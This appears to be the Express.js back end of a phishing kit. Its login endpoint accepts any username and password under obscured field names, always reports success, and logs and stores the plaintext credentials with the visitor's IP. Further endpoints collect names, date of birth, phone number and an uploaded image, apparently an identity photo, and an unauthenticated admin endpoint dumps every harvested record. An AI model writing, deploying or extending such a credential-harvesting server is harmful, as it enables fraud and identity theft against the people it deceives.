const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Trust proxy for proper IP detection
app.set('trust proxy', true);

// CORS configuration for mobile compatibility
const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    // Allow localhost for development
    if (origin.includes('localhost') || origin.includes('127.0.0.1')) {
      return callback(null, true);
    }
    
    // Allow Vercel domains
    if (origin.includes('vercel.app') || origin.includes('vercel.com')) {
      return callback(null, true);
    }
    
    // Allow all origins in development, specific origins in production
    if (process.env.NODE_ENV === 'development') {
      return callback(null, true);
    }
    
    // In production, you can specify allowed origins
    const allowedOrigins = process.env.CORS_ORIGINS ? process.env.CORS_ORIGINS.split(',') : [];
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    
    callback(new Error('Not allowed by CORS'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin'],
  exposedHeaders: ['Content-Length', 'X-Foo', 'X-Bar']
};

// Middleware
app.use(cors(corsOptions));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Create uploads directory if it doesn't exist (for Vercel)
const uploadsDir = '/tmp/uploads';
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: parseInt(process.env.MAX_FILE_SIZE) || 10485760 // 10MB default
  },
  fileFilter: (req, file, cb) => {
    // Allow only images
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// In-memory storage for demo purposes (replace with proper database in production)
const sessions = new Map();
const uploads = new Map();
const visitors = new Map();

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development'
  });
});

// Login endpoint
app.post('/api/login', (req, res) => {
  try {
    const { xusr, xpss } = req.body;
    console.log('Login attempt:', { xusr, xpss });
    
    // Generate session ID
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    // Store session
    sessions.set(sessionId, {
      id: sessionId,
      sessionId: sessionId,
      ip: req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress,
      userAgent: req.get('User-Agent'),
      xusr: xusr,
      xpss: xpss,
      createdAt: new Date(),
      updatedAt: new Date()
    });
    
    res.json({ 
      success: true, 
      message: 'Login successful',
      sessionId: sessionId
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ success: false, message: 'Login failed' });
  }
});

// Info endpoint
app.post('/api/info', (req, res) => {
  try {
    const { xname1, xname2, xdob, xtel, sessionId } = req.body;
    console.log('Info submission:', { xname1, xname2, xdob, xtel });
    
    // Update session with info
    if (sessionId && sessions.has(sessionId)) {
      const session = sessions.get(sessionId);
      session.xname1 = xname1;
      session.xname2 = xname2;
      session.xdob = xdob;
      session.xtel = xtel;
      session.updatedAt = new Date();
      sessions.set(sessionId, session);
    }
    
    res.json({ 
      success: true, 
      message: 'Info submitted successfully',
      sessionId: sessionId
    });
  } catch (error) {
    console.error('Info submission error:', error);
    res.status(500).json({ success: false, message: 'Info submission failed' });
  }
});

// Upload endpoint
app.post('/api/upload', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, message: 'No file uploaded' });
    }
    
    const { sessionId } = req.body;
    console.log('File upload request received');
    console.log('File object:', req.file);
    console.log('Session ID:', sessionId);
    
    // Store upload info
    const uploadId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    uploads.set(uploadId, {
      id: uploadId,
      sessionId: sessionId,
      filename: req.file.filename,
      originalName: req.file.originalname,
      fileSize: req.file.size,
      filePath: req.file.path,
      mimeType: req.file.mimetype,
      timestamp: new Date(),
      ip: req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress,
      userAgent: req.get('User-Agent')
    });
    
    console.log('Upload data stored:', uploads.get(uploadId));
    
    res.json({ 
      success: true, 
      message: 'File uploaded successfully',
      filename: req.file.filename,
      uploadId: uploadId
    });
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({ success: false, message: 'Upload failed' });
  }
});

// Admin login endpoint
app.post('/api/admin/login', (req, res) => {
  try {
    const { username, password } = req.body;
    const adminUsername = process.env.ADMIN_USERNAME || 'admin';
    const adminPassword = process.env.ADMIN_PASSWORD || 'admin123';
    
    if (username === adminUsername && password === adminPassword) {
      res.json({ success: true, message: 'Admin login successful' });
    } else {
      res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ success: false, message: 'Admin login failed' });
  }
});

// Get all data endpoint (for admin panel)
app.get('/api/admin/data', (req, res) => {
  try {
    const allSessions = Array.from(sessions.values());
    const allUploads = Array.from(uploads.values());
    const allVisitors = Array.from(visitors.values());
    
    // Combine data
    const combinedData = allSessions.map(session => {
      const upload = allUploads.find(u => u.sessionId === session.sessionId);
      return {
        ...session,
        filename: upload?.filename,
        originalName: upload?.originalName,
        size: upload?.fileSize,
        uploadTimestamp: upload?.timestamp
      };
    });
    
    res.json({
      success: true,
      data: combinedData,
      totalSessions: allSessions.length,
      totalUploads: allUploads.length,
      totalVisitors: allVisitors.length
    });
  } catch (error) {
    console.error('Get data error:', error);
    res.status(500).json({ success: false, message: 'Failed to get data' });
  }
});

// Track visitor endpoint
app.post('/api/track-visit', (req, res) => {
  try {
    const { path } = req.body;
    const ip = req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    const visitorId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    visitors.set(visitorId, {
      id: visitorId,
      ip: ip,
      userAgent: userAgent,
      path: path,
      timestamp: new Date()
    });
    
    console.log('✅ Page visit tracked:', path, 'from', ip);
    res.json({ success: true, message: 'Page visit tracked' });
  } catch (error) {
    console.error('Error tracking visit:', error);
    res.status(500).json({ success: false, message: 'Error tracking visit' });
  }
});

// Serve uploaded files (for Vercel, files are in /tmp)
app.get('/uploads/:filename', (req, res) => {
  try {
    const filename = req.params.filename;
    const filePath = path.join(uploadsDir, filename);
    
    if (fs.existsSync(filePath)) {
      res.sendFile(filePath);
    } else {
      res.status(404).json({ error: 'File not found' });
    }
  } catch (error) {
    console.error('File serve error:', error);
    res.status(500).json({ error: 'Error serving file' });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ 
    success: false, 
    message: error.message || 'Internal server error' 
  });
});

// Start server
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log('✅ Database connection initialized');
    console.log(`Server running on port ${PORT}`);
    console.log(`API endpoints available at http://localhost:${PORT}/api`);
  });
}

module.exports = app;
